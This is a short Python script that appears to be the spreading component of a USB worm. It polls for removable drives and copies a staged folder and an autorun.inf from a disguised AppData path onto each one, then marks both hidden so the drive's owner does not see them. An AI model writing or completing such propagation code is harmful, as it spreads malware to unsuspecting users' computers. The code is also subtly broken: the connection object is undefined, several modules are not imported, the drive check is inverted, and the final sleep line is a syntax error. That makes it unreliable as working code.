import wmi
import time

def scan():
	#Identify all connected removable storage devices
	remov_disks = c.Win32_LogicalDisk(DriveType=2)
	#End if no storage devices connected
	if len(remov_disks):
		return
		
	for disk in remov_disks:
		#Copy files to disk
		shutil.copytree(
			r'C:\Users\%s\AppData\Local\Microsoft\Windows\Explorer\temp' % os.environ.get("USERNAME"),
			r'%s' % disk.Name
		)
		shutil.copy(
			r'C:\Users\%s\AppData\Local\Microsoft\Windows\Explorer\autorun.inf' % os.environ.get("USERNAME"),
			r'%s' % disk.Name
		)
		#hide directory
		win32api.SetFileAttributes(
			r'%s\temp' % disk.Name,
			win32con.FILE_ATTRIBUTE_HIDDEN
		)
		#hide autorun.inf
		win32api.SetFileAttributes(
			r'%s\autorun.inf' % disk.Name,
			win32con.FILE_ATTRIBUTE_HIDDEN
		)
if __name__ == "__main__":
	while True:
		scan()
		time.sleep(10):
		